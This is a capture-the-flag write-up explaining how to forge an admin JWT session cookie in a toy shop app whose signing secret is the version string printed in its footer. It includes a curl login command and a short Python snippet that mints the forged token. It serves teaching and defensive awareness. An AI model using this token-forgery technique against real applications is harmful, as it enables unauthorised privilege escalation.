---
title: Web CTF 2026 — Cookie Forge
date: 2026/08/12
category: Web
tags: web, jwt, cookies
cover: writeup-web
excerpt: Forging a session cookie by abusing a weak signing secret in a toy shop app.
---

## Overview

The challenge hands you a small shop app. Every user gets a signed session cookie, and the admin panel is gated behind a role claim inside that cookie.

Goal: read `/admin` and pull the flag.

## Recon

The cookie is a three part token — header, payload, signature. Base64 decoding the payload shows a plain role field, which is always set to `guest`.

```bash
$ curl -i https://target/login -d 'user=guest'
Set-Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.<sig>
```

## The Bug

The signing secret is derived from the app version string that is helpfully printed in the footer of every page. Short, guessable, and reused across deployments.

That means the signature is not a trust boundary at all — anyone can mint tokens.

## Exploit

Re-sign the payload with role set to `admin` and replay the request.

```python
import jwt
tok = jwt.encode({"role": "admin"}, "shop-v1.4.2", algorithm="HS256")
print(tok)
```

## Flag

Sending the forged cookie to `/admin` drops the flag straight into the response body.

Lesson: never derive secrets from anything you also render to the user.

```text
flag{n3v3r_s1gn_w1th_y0ur_v3rs10n_str1ng}
```
